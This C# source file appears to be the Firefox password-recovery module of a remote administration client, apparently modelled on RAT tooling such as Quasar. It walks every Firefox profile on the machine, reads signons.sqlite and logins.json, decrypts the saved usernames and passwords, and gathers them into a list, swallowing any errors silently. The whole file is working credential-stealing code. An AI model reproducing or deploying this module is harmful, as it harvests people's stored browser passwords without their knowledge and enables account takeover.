using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Json;
using RemoteAdmin.Shared;

namespace RemoteAdmin.Client.Recovery.Browsers
{
    public class FirefoxPassReader : IAccountReader
    {
        /// <inheritdoc />
        public string ApplicationName => "Firefox";

        /// <inheritdoc />
        public IEnumerable<RecoveredAccount> ReadAccounts()
        {
            var logins = new List<RecoveredAccount>();

            try
            {
                string profilesPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Mozilla\\Firefox\\Profiles");

                if (!Directory.Exists(profilesPath))
                    return logins;

                string[] dirs = Directory.GetDirectories(profilesPath);

                if (dirs.Length == 0)
                    return logins;

                foreach (string dir in dirs)
                {
                    try
                    {
                        ReadProfileLogins(dir, logins);
                    }
                    catch (Exception)
                    {
                        // Continue with next profile if this one fails
                        continue;
                    }
                }
            }
            catch (Exception)
            {
                // Return whatever we managed to collect
            }

            return logins;
        }

        private void ReadProfileLogins(string profileDir, List<RecoveredAccount> logins)
        {
            string signonsFile = Path.Combine(profileDir, "signons.sqlite");
            string loginsFile = Path.Combine(profileDir, "logins.json");

            bool signonsFound = File.Exists(signonsFile);
            bool loginsFound = File.Exists(loginsFile);

            if (!loginsFound && !signonsFound)
                return;

            using (var decrypter = new FFDecryptor())
            {
                var initResult = decrypter.Init(profileDir);

                // If init failed, we can't decrypt
                if (initResult != 0)
                    return;

                // Handle old SQLite format (signons.sqlite)
                if (signonsFound)
                {
                    try
                    {
                        ReadSignonsSqlite(signonsFile, decrypter, logins);
                    }
                    catch (Exception)
                    {
                        // Continue to try JSON format
                    }
                }

                // Handle newer JSON format (logins.json)
                if (loginsFound)
                {
                    try
                    {
                        ReadLoginsJson(loginsFile, decrypter, logins);
                    }
                    catch (Exception)
                    {
                        // Ignore errors in this profile
                    }
                }
            }
        }

        private void ReadSignonsSqlite(string signonsFile, FFDecryptor decrypter, List<RecoveredAccount> logins)
        {
            using (var sqlDatabase = new SQLiteHandler(signonsFile))
            {
                if (!sqlDatabase.ReadTable("moz_logins"))
                    return;

                int rowCount = sqlDatabase.GetRowCount();
                for (int i = 0; i < rowCount; i++)
                {
                    try
                    {
                        var host = sqlDatabase.GetValue(i, "hostname");
                        var encryptedUser = sqlDatabase.GetValue(i, "encryptedUsername");
                        var encryptedPass = sqlDatabase.GetValue(i, "encryptedPassword");

                        if (string.IsNullOrEmpty(host))
                            continue;

                        var user = decrypter.Decrypt(encryptedUser);
                        var pass = decrypter.Decrypt(encryptedPass);

                        if (!string.IsNullOrEmpty(user))
                        {
                            logins.Add(new RecoveredAccount
                            {
                                Url = host,
                                Username = user,
                                Password = pass ?? string.Empty,
                                Application = ApplicationName
                            });
                        }
                    }
                    catch (Exception)
                    {
                        // Skip invalid entry
                    }
                }
            }
        }

        private void ReadLoginsJson(string loginsFile, FFDecryptor decrypter, List<RecoveredAccount> logins)
        {
            FFLogins ffLoginData;

            using (var stream = new FileStream(loginsFile, FileMode.Open, FileAccess.Read))
            {
                var serializer = new DataContractJsonSerializer(typeof(FFLogins));
                ffLoginData = (FFLogins)serializer.ReadObject(stream);
            }

            if (ffLoginData?.Logins == null)
                return;

            foreach (Login loginData in ffLoginData.Logins)
            {
                try
                {
                    string username = decrypter.Decrypt(loginData.EncryptedUsername);
                    string password = decrypter.Decrypt(loginData.EncryptedPassword);

                    var url = loginData.Hostname?.ToString() ?? string.Empty;

                    logins.Add(new RecoveredAccount
                    {
                        Username = username ?? string.Empty,
                        Password = password ?? string.Empty,
                        Url = url,
                        Application = ApplicationName
                    });
                }
                catch (Exception)
                {
                    // Skip invalid entry
                }
            }
        }

        #region JSON Data Classes

        [DataContract]
        private class FFLogins
        {
            [DataMember(Name = "nextId")]
            public long NextId { get; set; }

            [DataMember(Name = "logins")]
            public Login[] Logins { get; set; }

            [DataMember(Name = "version")]
            public long Version { get; set; }
        }

        [DataContract]
        private class Login
        {
            [DataMember(Name = "id")]
            public long Id { get; set; }

            [DataMember(Name = "hostname")]
            public string Hostname { get; set; }

            [DataMember(Name = "httpRealm")]
            public object HttpRealm { get; set; }

            [DataMember(Name = "formSubmitURL")]
            public string FormSubmitUrl { get; set; }

            [DataMember(Name = "usernameField")]
            public string UsernameField { get; set; }

            [DataMember(Name = "passwordField")]
            public string PasswordField { get; set; }

            [DataMember(Name = "encryptedUsername")]
            public string EncryptedUsername { get; set; }

            [DataMember(Name = "encryptedPassword")]
            public string EncryptedPassword { get; set; }

            [DataMember(Name = "guid")]
            public string Guid { get; set; }

            [DataMember(Name = "encType")]
            public long EncType { get; set; }

            [DataMember(Name = "timeCreated")]
            public long TimeCreated { get; set; }

            [DataMember(Name = "timeLastUsed")]
            public long TimeLastUsed { get; set; }

            [DataMember(Name = "timePasswordChanged")]
            public long TimePasswordChanged { get; set; }

            [DataMember(Name = "timesUsed")]
            public long TimesUsed { get; set; }
        }

        #endregion
    }

    #region Supporting Interfaces and Classes

    public interface IAccountReader
    {
        string ApplicationName { get; }
        IEnumerable<RecoveredAccount> ReadAccounts();
    }

    #endregion
}